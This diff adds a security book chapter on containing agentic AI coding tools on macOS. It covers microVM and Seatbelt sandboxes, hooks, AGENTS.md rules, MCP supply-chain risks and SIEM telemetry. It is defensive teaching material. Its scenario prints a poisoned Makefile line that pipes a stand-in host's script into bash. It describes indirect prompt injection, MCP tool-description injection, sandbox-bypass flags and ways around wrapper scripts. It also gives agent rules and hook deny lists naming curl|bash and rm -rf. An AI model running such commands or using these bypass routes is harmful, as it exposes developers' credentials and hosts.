@@ -1,0 +1,925 @@
+# Chapter 23: Secure Agentic AI Development on macOS
+
+## Learning Objectives
+
+By the end of this chapter, you will be able to:
+
+- Explain why **agentic AI tools** change the macOS endpoint threat model and how indirect prompt injection differs from direct attacks.
+- Compare **host execution**, `sbx` microVMs, native Seatbelt sandboxes, and policy-based guardrails (hooks, rules).
+- Deploy **`sbx` Sandboxes** on Apple Silicon Macs for Claude Code, Codex, OpenCode, and related agents.
+- Configure **native sandboxes** per agent (Cursor, Claude Code, Codex CLI, Devin Local) including `sandbox.json`.
+- Export agent telemetry via **OpenTelemetry** to SIEM platforms (Datadog, Splunk, Elastic, Sentinel) through OTLP collectors.
+- Apply **policy-based guardrails** when host execution is required: `AGENTS.md`, `CLAUDE.md`, Cursor rules, and hooks.
+- Vet **agent skills, MCP servers, and plugins** as supply-chain artifacts.
+- Integrate controls with **Santa**, **osquery**, **MDM**, and **SIEM** using Bash automation patterns from prior chapters.
+
+## Introduction
+
+Agentic AI coding tools — Claude Code, Codex CLI, Cursor, GitHub Copilot CLI, OpenCode, and Devin Local — do more than autocomplete a line of code. They read repositories, run shell commands, edit files, call MCP servers, and iterate toward goals with minimal human oversight. On macOS, that means a semi-autonomous process operating at machine speed inside an environment rich with credentials: SSH keys, cloud CLI configs, Docker sockets, Keychain items, and localhost services.
+
+Traditional endpoint controls were designed for human-operated terminals. An agent can chain dozens of tool calls in minutes, install dependencies, modify git hooks, and exfiltrate data through any channel the policy allows — including the model API itself. Security teams need a layered program: **isolation where practical**, **deterministic enforcement where isolation is impractical**, and **fleet-wide observability** so incidents are detectable and containable.
+
+This chapter is the Part III capstone. It extends the Seatbelt primer from Chapters 10 and 11, ties into **mSCP and PPPC** (Chapter 14), **osquery detection** (Chapter 18), **Santa binary control** (Chapter 21), and **time-bound elevation** (Chapter 22). The goal is not approval fatigue — it is making the secure path the default.
+
+### Enterprise Agentic AI Context
+
+**Why macOS endpoints are high-stakes for agents:**
+
+- **Credential density:** `~/.ssh`, `~/.aws`, `~/.kube`, `~/.docker/config.json`, and Keychain-backed OAuth tokens are routinely present on developer laptops.
+- **TCC inheritance:** Agents inherit Transparency, Consent, and Control grants of their host application. Full Disk Access on Terminal or an IDE flows to every agent session launched from it.
+- **Local services:** Host-path agents can reach `localhost` databases, admin APIs, and unauthenticated internal tools — a common blind spot when teams focus only on outbound internet egress.
+- **Cloud trust boundary:** Sandboxing constrains what an agent does **on the laptop**. It does not stop source code, prompts, or in-repo secrets from reaching the model provider. Zero-data-retention agreements, regional residency, and cloud-agent execution models are separate policy decisions.
+
+**Business drivers:**
+
+- **Speed vs. risk:** Agents accelerate delivery but amplify blast radius of a single compromised instruction or dependency.
+- **Compliance:** Regulated teams need auditable evidence of containment (hooks, sandboxes, OTel) — not ticket queues that developers bypass.
+- **Fleet consistency:** Ad hoc "YOLO mode" on individual laptops does not scale; MDM-managed settings and Bash wrappers enforce org policy.
+
+## Building Your Agentic AI Security Program
+
+Think in layers. No single control is sufficient.
+
+```
+Threat (injection, supply chain, insider)
+  |
+  +-- Isolation: sbx microVM | native Seatbelt | (none = host path)
+  +-- Policy: AGENTS.md / CLAUDE.md / .cursor/rules (advisory)
+  +-- Enforcement: PreToolUse / beforeShellExecution hooks (deterministic)
+  +-- Binary control: Santa TeamID allowlists (Ch 21)
+  +-- Detection: osquery process chains (Ch 18)
+  +-- Observability: OpenTelemetry -> collector -> SIEM
+```
+
+**Guardrails vs. gates:** Per-command approval dialogs assume humans can judge context faster than the agent acts. In practice, approval fatigue leads to clicks without review. **Guardrails** change the default: sandboxed execution requires no ticket; host execution requires a documented, time-bound exception (the Chapter 22 Privileges model applied to agent workflows).
+
+### Three-path decision tree
+
+```
+Need macOS-native toolchain (Xcode, codesign, notarization, Instruments)?
+  YES -> Host path: native Seatbelt (if available) + AGENTS.md/CLAUDE.md/rules
+         + PreToolUse hooks + Santa + osquery
+  NO  -> Is repo crown-jewel or unattended agent?
+          YES -> sbx microVM (prefer --clone for sensitive repos)
+          NO  -> Native Seatbelt (Cursor/Claude/Codex) + optional hooks for MCP
+```
+
+**When sandboxing causes friction:** microVMs lack direct Keychain signing flows, Xcode derived data outside the workspace, USB devices, and some TCC-gated APIs. That is not a reason to skip security — it is a reason to use the **controlled host path** with hooks, Santa, and SIEM telemetry rather than bare YOLO flags.
+
+### Organizational readiness self-check
+
+| Pattern | Risk |
+|---------|------|
+| Agents on bare metal with full shell env | Credential and filesystem exposure |
+| Host `docker.sock` mounted for agent containers | Full daemon control on host |
+| Broad cloud IAM on developer endpoints | Agent inherits cloud blast radius |
+| Per-command approval as security boundary | Fatigue, bypass, invisible side effects |
+| Code review only for agent output | Misses dependency-time and hook-time attacks |
+
+## 23.1 The Agentic Threat Model on macOS
+
+### Human-operated vs. agentic execution
+
+A human runs `git status`, reads the output, and decides the next step. An agent runs `git status`, interprets output in context, may run `git push`, edit CI files, and invoke MCP tools — without pausing between steps. Blast radius scales with **tool access**, **network egress**, and **credential reach**.
+
+### Direct vs. indirect prompt injection
+
+**Direct injection:** the user (or attacker with UI access) submits malicious instructions in the chat prompt.
+
+**Indirect injection:** the agent ingests untrusted content and treats embedded instructions as policy. Sources include:
+
+- Pull request descriptions and issue comments
+- `README` files and code comments in cloned repos
+- Web pages fetched via MCP browser tools
+- MCP tool **output** returned on the next turn
+- Dependency changelogs and `Makefile` targets
+- Skill instructions and plugin metadata
+
+Indirect injection is the dominant real-world pattern for agent compromises. Controls must assume **untrusted repository content** and **untrusted tool output**, not only malicious user prompts.
+
+### The lethal trifecta
+
+Exfiltration typically requires three conditions simultaneously:
+
+1. **Access to private data** (source code, env files, credentials)
+2. **Exposure to untrusted content** (repo, web, MCP output)
+3. **Ability to communicate externally** (network, model API, allowed registry)
+
+Remove any leg and many attacks fail. When evaluating a control, ask which leg it breaks — and whether a **allowed** egress channel (model API, DNS, npm registry) still carries encoded secrets.
+
+### Cloud vs. local trust boundary
+
+Local sandboxing answers: "What can this process do on my Mac?" It does not answer: "What leaves my Mac?" Source code, file excerpts, and secrets in prompts may be transmitted to Anthropic, OpenAI, Cursor, or other providers according to product terms and enterprise agreements. **Cursor cloud agents** execute in provider infrastructure — the endpoint sandbox does not apply there. Document data classification, zero-data-retention (ZDR) contracts, and residency requirements alongside technical controls.
+
+### macOS attack surfaces
+
+| Surface | Agent relevance |
+|---------|-----------------|
+| Filesystem | Read/write project and home paths |
+| Credentials | SSH, cloud CLIs, Keychain, env vars |
+| Docker socket | Full container lifecycle on host |
+| `localhost` | Internal APIs without auth |
+| Apple Silicon `virtualization.framework` | `sbx` microVM isolation |
+| TCC / PPPC | Inherited from host app |
+
+### Failure modes (actor x capability x risk)
+
+| Actor | Capability | Risk |
+|-------|------------|------|
+| External attacker via indirect injection | Run shell, edit files, call MCP | Repo takeover, credential theft |
+| Malicious dependency | Postinstall scripts, build targets | Host compromise on bare metal |
+| Insider | Disable telemetry, use YOLO flags | Unaudited exfiltration |
+| Compromised skill/MCP server | Tool definitions, OAuth tokens | Fleet-wide supply chain |
+
+### Scenario walkthrough (book-original)
+
+Consider a developer who asks an agent to "fix the failing CI build" in a cloned open-source fork. The agent reads a poisoned `Makefile` target that runs during `make test`:
+
+```makefile
+.PHONY: test
+test:
+	@curl -s https://updates.example-cdn.test/bootstrap.sh | bash
+	@go test ./...
+```
+
+On **bare metal**, the pipe-to-bash executes with the developer's user privileges — accessing `~/.aws`, SSH agent sockets, and Keychain items permitted to the host terminal.
+
+In **`sbx`**, the curl may still run inside the microVM, but host paths outside the workspace are not writable by default; private-range egress is blocked unless allowed. Residual risk: exfiltration through an **allowed** HTTPS endpoint (model API or permitted registry).
+
+In **native Seatbelt** (Claude/Codex/Cursor), bash subprocesses are constrained, but read scope varies by product — Cursor can read `~/.ssh` regardless of `sandbox.json` network rules. Pair with `beforeReadFile` hooks and Santa.
+
+> **Danger zone:** Codex `--dangerously-bypass-approvals-and-sandbox` and host-path agents without any sandbox layer delegate security review to the model.
+
+### Per-product danger zones
+
+| Product / mode | What bypasses | What remains |
+|----------------|---------------|--------------|
+| Claude Code + `--dangerously-skip-permissions` | Permission prompts | OS Seatbelt if enabled |
+| Codex YOLO flag | Prompts and sandbox | Nothing |
+| `sbx` + direct mount | Host FS outside workspace | Live edits inside workspace path on host |
+| Aider on host | N/A | No native sandbox |
+| Devin Local | Reduced by OS sandbox + hooks | Per Devin team policy |
+
+## 23.2 Isolation Options: Choosing the Right Boundary
+
+| Approach | Isolation | Network | FS read | FS write | Docker | Apple Silicon `sbx` | Best for |
+|----------|-----------|---------|---------|----------|--------|---------------------|----------|
+| Host execution | None | Full | Full home | Full home | Full socket | N/A | Trusted humans only |
+| Container + `docker.sock` | Namespaces | None | Mount | Mount | Full socket | N/A | **Avoid for agents** |
+| **`sbx` microVM** | Hypervisor | Proxy policy | Workspace (direct mount) | Workspace + VM | Private daemon | **Required** | Unattended agents, Docker builds |
+| **`sbx --clone`** | Hypervisor | Proxy policy | Read-only host | VM clone only | Private daemon | Required | Crown-jewel repos |
+| Claude Code Seatbelt | OS | Limited | Workspace + some home | Workspace-scoped | N/A | N/A | Daily dev |
+| Codex CLI Seatbelt | OS | Mode-dependent | Mode-dependent | `workspace-write` etc. | N/A | N/A | OpenAI workflows |
+| Cursor Seatbelt | OS + `sandbox.json` | `networkPolicy` | Workspace; **full FS read possible** | Workspace-scoped | N/A | N/A | IDE/CLI |
+| GitHub Copilot CLI | **Advisory only** | Hook-dependent | Full host | Hook-gated | N/A | N/A | Use `sbx` for OS isolation |
+| Devin Local | OS sandbox + hooks | Policy | Configurable | Configurable | N/A | N/A | Devin Desktop fleets |
+| Host + rules/hooks | Advisory + hooks | Hook-dependent | Full host | Hook-gated | Full socket | N/A | Xcode, signing, Instruments |
+
+> **Important:** Default `sbx` workspace mount is **direct passthrough** at the same absolute path — agent edits are **live on the host**. Use `--clone` for high-risk repositories.
+
+### What containment does NOT promise
+
+- **Allowed egress is exfil egress.** The model API, an allowed package registry, DNS queries, and your OTel collector can all carry encoded secrets.
+- Sandboxing protects the **host**, not the **code you hand the agent** or unaudited output a human later merges.
+- Repo contents and in-repo secrets are visible to the agent inside the boundary.
+- The `sbx` TLS proxy sees plaintext for inspected HTTPS flows; `--bypass-host` exists for cert-pinned endpoints.
+- Host-path agents inherit **parent shell environment variables** and **TCC grants** of Terminal or IDE.
+
+### `sbx` architecture on macOS
+
+```
+Mac Host (Apple Silicon)
+  |
+  +-- sbx CLI / org governance
+  |
+  +-- MicroVM (virtualization.framework)
+        +-- Private Docker daemon
+        +-- Agent container
+        +-- Workspace at same path (direct mount OR --clone)
+        +-- HTTP/HTTPS proxy (credential injection, network policy)
+              --> Allowed egress only
+```
+
+`sandbox-exec` (Seatbelt) remains load-bearing for Cursor, Claude, and Chrome but is **deprecated by Apple** since 2016. Document honestly: you depend on a legacy API with no public replacement for arbitrary third-party CLI sandboxes.
+
+## 23.3 Prerequisites and Platform Requirements
+
+### Hardware and platform
+
+- **`sbx` on macOS requires Apple Silicon** (macOS Sonoma 14+). Intel Macs cannot run the hands-on `sbx` lab in this chapter — use native Seatbelt agents or a Linux KVM host for microVM isolation.
+- **Docker Desktop is not required** for `sbx`. Install via Homebrew: `brew install docker/tap/sbx`, then sign in with a Docker account.
+
+### `sbx` CLI setup
+
+```bash
+brew install docker/tap/sbx
+sbx version
+sbx run claude   # after cd into project directory
+```
+
+Set `SBX_NO_TELEMETRY=1` to opt out of Docker telemetry if policy requires. Org governance tiers are separate from Docker Desktop licensing.
+
+### Disk, RAM, and EDR
+
+MicroVMs consume additional RAM and disk versus host execution. Corporate egress must allow `login.docker.com` and `registry-1.docker.io` at minimum. Endpoint detection and response (EDR) agents on the host still see `sbx` process activity but **cannot see inside** the microVM guest — correlate with `sbx policy log` and agent OTel instead.
+
+### TCC / PPPC matrix
+
+| TCC permission | Why agents trigger it |
+|----------------|----------------------|
+| Full Disk Access | Terminal/IDE reading outside workspace |
+| Automation (AppleEvents) | `osascript`, app control |
+| Developer Tools | Debugging, some CLIs |
+| Keychain | OAuth flows (`gh auth`, device code) |
+| Files & Folders | Granular alternative to FDA |
+
+Deploy PPPC payloads for approved agent bundle IDs via MDM (Chapter 14). Sandbox profiles do **not** exempt agents from TCC.
+
+> **Production note:** An agent **inherits TCC grants of its host app**. If Cursor or Terminal has Full Disk Access, the agent can read paths Seatbelt might otherwise block. Do not grant FDA to agent host applications.
+
+### FileVault
+
+FileVault protects data **at rest** on lost or stolen devices. It is **orthogonal to runtime agent containment** — the volume is decrypted while the user is logged in and the agent runs.
+
+### macOS credential surfaces
+
+| Surface | Host path | Native Seatbelt | `sbx` microVM |
+|---------|-----------|-----------------|---------------|
+| `~/.ssh` keys | Exposed | Partially readable (Cursor) | Workspace only |
+| `SSH_AUTH_SOCK` | Exposed | Often exposed | Usually blocked |
+| `~/.aws`, `~/.kube` | Exposed | Varies | Workspace only |
+| `~/.docker/config.json` | Exposed | Varies | Not in VM |
+| Exported `AWS_*` env vars | Inherited | Inherited | Not inherited |
+| Login Keychain via `security` CLI | Exposed if ACL allows | Exposed | Not in VM |
+| `localhost` services | Exposed | Varies | Private ranges blocked |
+
+> **Production note:** Avoid iCloud-synced or network-mounted workspace paths for `sbx`. Use local project directories.
+
+## 23.4 `sbx` Sandboxes: Hands-On Lab
+
+> **Note:** Older blog posts reference `docker sandbox` — that interface is deprecated. This chapter standardizes on **`sbx`**.
+
+### Supported agents (verify against current Docker docs)
+
+Claude Code, Codex, GitHub Copilot CLI, Gemini CLI, OpenCode, and Kiro are documented `sbx` agents. Custom shells are supported for bring-your-own workflows.
+
+### First session
+
+```bash
+cd ~/my-project
+sbx run claude
+sbx ls
+sbx exec -it SANDBOX_NAME bash
+sbx rm SANDBOX_NAME
+```
+
+`sbx run` is idempotent — it reuses an existing sandbox for the same workspace. Recreate after policy changes that require a new VM (e.g., `--clone`).
+
+### Authentication
+
+Prefer `sbx secret set` for supported providers (Anthropic, OpenAI, GitHub, etc.):
+
+```bash
+sbx secret set -g anthropic
+```
+
+`sbx secret` supports a **fixed service list** only. Arbitrary tokens can be placed in `/etc/sandbox-persistent.sh` inside the VM — but that file is **readable by the agent**. For enterprise fleets, proxy credential injection is the safer default.
+
+### Network policy
+
+Default mode blocks private IP ranges while allowing public HTTPS. Tune with:
+
+```bash
+sbx policy allow network registry.npmjs.org
+sbx policy log
+sbx policy ls
+sbx policy reset
+```
+
+Non-HTTP/HTTPS TCP requires explicit rules. UDP and ICMP are blocked. TLS inspection uses a sandbox CA; use `--bypass-host` for certificate-pinned endpoints.
+
+Example allowlist mindset (fictional hosts — adapt to your org):
+
+- `api.example-llm.internal`
+- `github.com`
+- `registry.npmjs.org`
+
+### `--clone` for crown-jewel repositories
+
+```bash
+sbx rm my-sandbox   # if reusing name
+cd ~/sensitive-repo
+sbx run --clone claude
+```
+
+Constraints:
+
+- **Create-time only** — toggle by removing and recreating the sandbox
+- **Requires a Git repository**
+- Exposes agent work via a `sandbox-<name>` Git remote you can `git fetch` from the host
+
+### Project-level configuration only
+
+Inside `sbx`, user-level config (`~/.claude`, `~/.codex`, `~/.cursor`) is **not** available. Commit project hooks and `AGENTS.md` in the repository. Agents run **without approval prompts** by default — treat unsandboxed usage as high risk.
+
+### Limitations
+
+- Resource overhead versus host execution
+- API churn — pin `sbx` version in MDM
+- Linux `sbx` exists (KVM) but this chapter focuses on macOS
+
+## 23.5 Native Agent Sandboxes (Per Product)
+
+Native sandboxes use macOS Seatbelt via `sandbox-exec`. They offer lower latency than microVMs but vary widely by product. Do not assume one agent's guarantees apply to another.
+
+### Cursor IDE and CLI
+
+Cursor applies Seatbelt to terminal commands. Enable via CLI:
+
+```bash
+agent --sandbox enabled
+```
+
+**`sandbox.json`** schema (workspace wins over global):
+
+```json
+{
+  "type": "workspace_readwrite",
+  "networkPolicy": {
+    "default": "deny",
+    "allow": ["github.com", "*.npmjs.org", "registry.npmjs.org"]
+  }
+}
+```
+
+Paths: `~/.cursor/sandbox.json` (global), `.cursor/sandbox.json` (workspace, higher priority). Boolean merge uses restrictive-wins for `type` and network defaults.
+
+> **Important:** Cursor can read **`~/.ssh` and other paths outside the workspace** regardless of `networkPolicy`. `sandbox.json` does not protect SSH keys. Use `beforeReadFile` hooks with `failClosed: true`, global ignore patterns, and Santa execution controls.
+
+File tools and MCP may sit **outside** the terminal sandbox — qualify read exfiltration paths in threat models. **Auto-review** classifiers are best-effort UX, not a security boundary.
+
+Troubleshooting: `agent --debug`, check Seatbelt preflight errors, verify feature flags.
+
+### Claude Code
+
+Claude Code applies OS Seatbelt to bash subprocesses. `@anthropic-ai/sandbox-runtime` can extend coverage to MCP and hooks for full-session isolation.
+
+- `--dangerously-skip-permissions` bypasses **permission prompts** but may leave OS sandbox enabled
+- Add `sbx` when you need Docker builds or crown-jewel isolation beyond Seatbelt
+
+Claude does **not** natively read `AGENTS.md` — import it from `CLAUDE.md`:
+
+```markdown
+@AGENTS.md
+```
+
+### Codex CLI
+
+Sandbox modes include `read-only`, `workspace-write`, and `danger-full-access`. `--full-auto` presets combine sandbox with approval policy. The YOLO flag bypasses sandbox entirely — reserve for break-glass with alerting and credential rotation.
+
+### GitHub Copilot CLI
+
+Copilot CLI has **no OS-level sandbox**. Security controls are **advisory**: hooks, tool allowlists, and trusted directories — not kernel enforcement. Native hooks ship GA:
+
+- Events: `preToolUse`, `postToolUse`, `userPromptSubmitted`, `sessionStart`, `sessionEnd`
+- Scopes: `.github/hooks/`, `~/.copilot/hooks/`, policy directories
+- `permissionDecision`: `allow` / `deny`
+
+For OS isolation, wrap with `sbx` or Agent Safehouse. OTel is available via the **Copilot SDK** (TelemetryConfig, W3C trace context) — not turnkey env-var export like Claude Code.
+
+### OpenCode, Aider, Devin Desktop
+
+- **OpenCode:** experimental native sandbox on macOS; MCP servers may run outside sandbox
+- **Aider:** no native sandbox — use `sbx` or Seatbelt wrapper
+- **Devin Desktop / Devin Local** (formerly Windsurf; Cascade EOL July 2025): OS sandbox, hooks, enterprise team settings; fails closed if sandbox unavailable
+
+> **Note:** Pair native sandboxes with hostname filtering (Little Snitch, LuLu — Appendix C) where Seatbelt cannot filter by domain.
+
+## 23.6 Policy-Based Guardrails: AGENTS.md, Rules, and Hooks
+
+When `sbx` or strict Seatbelt blocks legitimate macOS development (Xcode, `codesign`, `notarytool`, Instruments), teams need a **documented host path** with deterministic enforcement — not bare YOLO.
+
+> **Important:** Markdown instruction files are **advisory**. Hooks and permission rules are **deterministic**. Never imply `CLAUDE.md` alone prevents exfiltration.
+
+### Enforcement ladder
+
+```
+ADVISORY (steering)
+  |-- Chat prompt
+  |-- AGENTS.md / CLAUDE.md / .cursor/rules/*.mdc
+  |-- Skills / system prompts
+  |
+DETERMINISTIC (can block)
+  |-- sandbox.json / Codex approval policy / permission rules
+  |-- Hooks: command, HTTP, prompt (LLM judge), agent
+  |-- Auto-review classifiers (best-effort — NOT sole control)
+```
+
+Claude `PreToolUse` precedence: **deny from hook > ask > allow**.
+
+### AGENTS.md
+
+[agents.md](https://agents.md/) is a cross-agent Markdown standard for build commands, conventions, and security sections. Codex, Cursor, Copilot, and others read it natively. Keep under ~150 lines; link to `docs/security.md` for depth.
+
+Example security block:
+
+```markdown
+## Security considerations
+- Never read or print `.env`, `~/.ssh`, or `~/Library/Keychains`
+- Do not run `curl | bash` or `git push --force` without explicit user request
+- MCP servers: only those in `.mcp/allowlist.json`
+- Production changes require `make test` to pass
+```
+
+### CLAUDE.md and `.claude/rules/`
+
+Scopes: managed (`/Library/Application Support/ClaudeCode/`), user (`~/.claude/`), project (`./CLAUDE.md`), local (`CLAUDE.local.md`, gitignored). Path-scoped rules live in `.claude/rules/*.md` with `paths:` frontmatter.
+
+Write factual statements ("Deployment target is production") rather than imperative commands that resemble injection.
+
+### Cursor rules
+
+Use `.cursor/rules/*.mdc` with frontmatter (`description`, `globs`, `alwaysApply`). Plain `.md` files in `.cursor/rules/` are **ignored**. Team Rules (enterprise) take precedence: Team → Project → User.
+
+### Hooks — per platform summary
+
+**Claude Code** (`.claude/settings.json`): `PreToolUse`, `PermissionRequest`, `PermissionDenied`, `UserPromptSubmit`, `PostToolUse`. Types: `command`, `http`, `prompt`, `agent`, `mcp_tool`.
+
+Command hook example:
+
+```json
+{
+  "hooks": {
+    "PreToolUse": [{
+      "matcher": "Bash",
+      "hooks": [{
+        "type": "command",
+        "command": ".claude/hooks/validate-bash.sh"
+      }]
+    }]
+  }
+}
+```
+
+**Codex** (`.codex/hooks.json`, `requirements.toml`): `PreToolUse` / `PostToolUse`; **command type only** in production today. Managed hooks: `allow_managed_hooks_only = true`.
+
+**Cursor** (`.cursor/hooks.json`, `/Library/Application Support/Cursor/hooks.json`): `beforeShellExecution`, `beforeMCPExecution`, `beforeReadFile`, `beforeSubmitPrompt`. Set `failClosed: true` on security-critical MCP gates. Default is fail-open.
+
+**Cloud agents:** project `.cursor/hooks.json` only — not `~/.cursor/hooks.json`; command hooks only, no MCP hooks.
+
+Stack **command hooks first**, optional **prompt hooks** for ambiguous cases. LLM-as-judge is probabilistic — pair with Santa, osquery, and egress controls.
+
+### Inbound / untrusted-repo threat
+
+Cloning an untrusted repository delivers attacker-controlled hooks and instruction files. A malicious `.claude/hooks/validate-bash.sh` runs with user privileges on first agent session.
+
+**Mitigations:** folder trust; enterprise managed deny that cannot be overridden by project files; hook review in PR; hash-based trust (`/hooks` in Codex); never run agents in unreviewed clones.
+
+### Recommended host-path stack
+
+1. `AGENTS.md` with security section (reviewed in PR)
+2. `CLAUDE.md` with `@AGENTS.md` import
+3. PreToolUse / `beforeShellExecution` command hooks — deny `rm -rf`, `curl|bash`, writes to `~/.ssh`, `.git/hooks`
+4. Optional prompt hook for ambiguous commands
+5. Native Seatbelt where available
+6. Santa allowlist for agent binaries (Chapter 21)
+7. osquery for hook bypass / direct binary invocation (Chapter 18)
+8. Time-bound host exception with expiry (Chapter 22 model)
+
+### Agent maturity matrix
+
+| Agent | AGENTS.md | Rules | Hooks | LLM judge | Classifier | MDM |
+|-------|-----------|-------|-------|-----------|------------|-----|
+| Claude Code | via `@` import | CLAUDE.md | GA | Yes | PermissionDenied | Managed settings |
+| Codex | Native | `.codex/` | GA command | Partial | Approval policy | `requirements.toml` |
+| Cursor | Native | `.mdc` | GA | Yes | Auto-review | Team Rules |
+| Copilot CLI | Native | Instructions | GA | No | Advisory | Intune |
+| Devin Local | Native | Team settings | GA | Varies | OS sandbox | Enterprise |
+| Aider | Native | None | No | No | None | None |
+
+## 23.7 Agent Skills, MCP Servers, and the Supply Chain
+
+Skills are instruction templates; MCP servers are persistent tool processes — different vetting, different blast radius.
+
+### Why traditional supply chain tools fall short
+
+| Control | Skills/MCP gap |
+|---------|----------------|
+| Static analysis | Instructions are natural language |
+| SBOM | No dependency graph for prompt text |
+| Code signing | Runtime-loaded instructions change behavior |
+
+### Attack patterns
+
+- Weaponized instructions in skill metadata
+- Silent exfiltration via DNS or allowed HTTPS endpoints
+- Credential harvesting through email → token → vault chains
+- **MCP tool-description injection** at connection time
+- **Rug-pull:** tool definitions change after user approval
+- **Tool shadowing:** name collision with trusted tools
+- **MCP output as indirect injection** on the next agent turn
+- Local MCP servers on the host **outside** any agent sandbox
+
+### Zero-trust controls
+
+- Private registries and signed skill bundles where available
+- `.mcp/allowlist.json` deny-by-default in each repo
+- Per-invocation authorization and least-privilege IAM for MCP backends
+- Timeouts and network allowlists on MCP processes
+
+### MCP SSH Orchestrator (example)
+
+Declarative YAML deny-by-default SSH orchestration with audit JSON — one pattern among many for constraining MCP-driven infrastructure access. See Appendix C for the project link.
+
+### Detection ownership
+
+| IoC | Santa | osquery | Proxy | SIEM |
+|-----|-------|---------|-------|------|
+| Unknown MCP binary | Maybe | Yes | — | OTel MCP events |
+| Egress to new domain | — | — | Yes | `sbx policy log` |
+| Hook deny spike | — | — | — | `tool_decision` deny |
+
+Skills rollout phases (governance in 23.12): inventory → immediate mitigation → advanced controls → continuous improvement.
+
+## 23.8 Frictionless Secure Defaults (Guardrails Over Gates)
+
+Gatekeeping fails for agents because:
+
+1. Requests are not rare — agents generate many tool calls per task
+2. Context is not obvious — indirect injection hides in repo content
+3. Humans cannot outpace machine-speed execution
+
+| Approach | Developer UX | Security evidence |
+|----------|--------------|-------------------|
+| Per-command approval | Fatigue, bypass | Sparse, subjective |
+| Sandbox-by-default | Fast for routine work | OTel + policy logs |
+| Host exception | Ticket + expiry | Auditable exception record |
+
+**Four patterns:** identity as control plane, device trust, least privilege by default, audit without friction.
+
+**Metrics:**
+
+| Signal | Healthy | Warning |
+|--------|---------|---------|
+| Manual agent approvals | Decreasing | Growing |
+| Host execution exceptions | Rare | Routine |
+| Break-glass usage | Low, investigated | Normalized |
+| Agent security incidents | Rare, contained | Frequent |
+
+Break-glass must be rare, noisy, and uncomfortable — not a daily workflow.
+
+## 23.9 Enforcement Patterns with Bash and MDM
+
+All examples use `set -euo pipefail`. **Rewrite prefixes and paths** for your org — do not copy blog literals.
+
+### Context-aware wrapper
+
+```bash
+#!/bin/bash
+set -euo pipefail
+
+run_claude_isolated() {
+  local workspace="$PWD"
+  if [[ -f "$workspace/.agent-isolation-required" ]]; then
+    echo "[acme-devx] Running via sbx for ${workspace}"
+    cd "$workspace" && sbx run claude -- "$@"
+  else
+    echo "[acme-devx] WARNING: host execution for ${workspace}" >&2
+    command claude "$@"
+  fi
+}
+```
+
+### Additional patterns
+
+1. Shell alias (soft nudge only)
+2. Shim in `/opt/company/bin/` ahead of PATH
+3. Repo helper `./tools/run-agent-sandbox.sh`
+4. MDM-managed `/etc/profile.d/` with `sbx` version pin
+5. CI attestation markers (git alone cannot prove sandbox use)
+
+**Bypass realities:** `command claude`, full path, alternate shells, unsandboxed MCP, **persistence via `~/.zshrc` or LaunchAgents**. Pair wrapper with Santa + MDM for managed fleets.
+
+See `ebook/assets/scripts/agent-sandbox-wrapper.sh` for a starter implementation.
+
+## 23.10 Enterprise Integration with Existing macOS Controls
+
+This section is the ebook's center of gravity — connect agent containment to controls you already deploy.
+
+### Santa (Chapter 21)
+
+Allowlist agent binaries by TeamID: `claude`, `cursor`, `codex`, `sbx`, **Devin** (post-rebrand). Run monitor mode before lockdown.
+
+> **Honest limit:** Santa is a **binary** allowlist. Once `python3`, `node`, `bash`, and `osascript` are allowed for development, Santa **cannot distinguish agent-driven abuse from legitimate interpreter use**. Pair Santa with hooks, osquery, and egress controls.
+
+### osquery (Chapter 18)
+
+Example detection themes:
+
+```sql
+-- Agent CLI spawn (illustrative — tune paths for your fleet)
+SELECT time, path, pid, parent
+FROM process_events
+WHERE path LIKE '%/claude%'
+   OR path LIKE '%/.cursor/%agent%'
+   OR path LIKE '%/codex%';
+```
+
+Correlate suspicious parent-child chains with LOTL patterns from Chapter 18.
+
+### mSCP / PPPC (Chapter 14)
+
+Map baseline rules: FileVault, firewall, Gatekeeper, SIP enabled before agent rollout. Deploy PPPC for approved agent bundle IDs.
+
+### SAP Privileges (Chapter 22)
+
+Agents should not require **standing admin**. Use time-bound elevation for host-path exceptions (Xcode installs) with automatic expiry — not recurring Privileges grants for daily agent use.
+
+### EDR / DLP
+
+EDR on the host cannot see inside `sbx` microVMs. Agent bursts can flood behavioral analytics. Endpoint DLP complements egress allowlists.
+
+### Detection to containment runbook
+
+1. **Detect:** OTel `tool_decision` deny spike; hook blocks; `permission_mode_changed`
+2. **Contain:** kill agent session; `sbx rm` for microVM; restrict egress
+3. **Preserve:** `sbx policy log` and OTel export **before** VM teardown (ephemeral VMs destroy evidence)
+4. **Recover:** rotate credentials the session could have touched; review git pushes
+
+### Multi-user and shared Macs
+
+- Per-user vs system-wide managed settings
+- `sbx` secrets in login keychain
+- Offboarding: revoke API keys, MCP OAuth tokens, wipe clones
+
+## 23.11 OpenTelemetry, Logs, Metrics, and SIEM Integration
+
+Security teams need **one observability pipeline** across Claude Code, Codex, Cursor, and supplementary streams (`sbx policy log`, Santa, osquery).
+
+### Reference architecture
+
+```
+Developer Mac
+  +-- Claude Code ----OTLP----+
+  +-- Codex CLI ------OTLP----+--> otelcol-contrib --> Datadog / Splunk / Elastic / Sentinel
+  +-- Cursor hooks ---OTLP----+       |
+  +-- sbx policy log -filelog-------+
+  +-- osquery (Ch 18) --------------+
+```
+
+Run a collector on each Mac or a fleet gateway. Do not point laptops directly at Splunk HEC without TLS, auth, and buffering.
+
+### Agent telemetry maturity
+
+| Agent | Native OTel | Config | SIEM-ready |
+|-------|-------------|--------|------------|
+| Claude Code | Yes | Managed `env` block | Best — documented SIEM events |
+| Codex CLI | Yes | `[otel]` in `config.toml` | Strong — set `metrics_exporter` |
+| Cursor | Hooks only | otel-hook, cursorscope | Community |
+| Copilot CLI | SDK-based | Copilot SDK / otel-hook | Emerging |
+| `sbx` | Via agent inside VM | `sbx policy log` separate | Merge in collector |
+
+Do not enable **native OTel and otel-hook** on the same agent without intent — duplicate telemetry.
+
+### Claude Code — managed OTel
+
+Deploy via `/Library/Application Support/ClaudeCode/managed-settings.json`:
+
+```json
+{
+  "env": {
+    "CLAUDE_CODE_ENABLE_TELEMETRY": "1",
+    "OTEL_METRICS_EXPORTER": "otlp",
+    "OTEL_LOGS_EXPORTER": "otlp",
+    "OTEL_TRACES_EXPORTER": "otlp",
+    "OTEL_EXPORTER_OTLP_PROTOCOL": "http/protobuf",
+    "OTEL_EXPORTER_OTLP_ENDPOINT": "http://127.0.0.1:4318",
+    "OTEL_LOG_TOOL_DETAILS": "1",
+    "OTEL_RESOURCE_ATTRIBUTES": "deployment.environment=prod,service.namespace=devtools"
+  }
+}
+```
+
+> **Note:** Managed settings JSON does **not** expand `${VAR}` placeholders. Use a localhost collector or a headers helper script for auth tokens.
